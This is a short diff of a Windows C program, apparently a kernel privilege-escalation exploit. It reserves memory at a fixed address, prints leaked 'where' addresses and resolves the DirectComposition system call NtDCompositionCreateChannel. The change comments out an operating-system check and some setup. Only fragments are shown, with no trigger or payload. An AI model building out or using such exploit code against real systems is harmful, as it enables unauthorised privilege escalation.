@@ -484,12 +484,12 @@ int main(int argc, TCHAR* argv[]) {
     SIZE_T SectionSize = 0x500000;
     PVOID pMappedAddress = NULL;
     DWORD dwArg1, dwArg2;
+    LoadLibrary(TEXT("user32"));
 
-    if (!InitEnvironment()) {
+    /*if (!InitEnvironment()) {
         printf("[-] Inappropriate Operating System\n");
         return 0;
     }
-    LoadLibrary(TEXT("user32"));
 
     LPVOID pV = VirtualAlloc((LPVOID)0x11223344, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (!pV)
@@ -542,7 +542,7 @@ int main(int argc, TCHAR* argv[]) {
     printf("\n[+] where: %p\n", where);
     printf("[+] where - 8 + 3: %p\n", where - 8 + 3);
 
-
+    */
     _NtDCompositionCreateChannel NtDCompositionCreateChannel;
     NtDCompositionCreateChannel = (_NtDCompositionCreateChannel)GetProcAddress(LoadLibrary(L"win32u.dll"), "NtDCompositionCreateChannel");
 
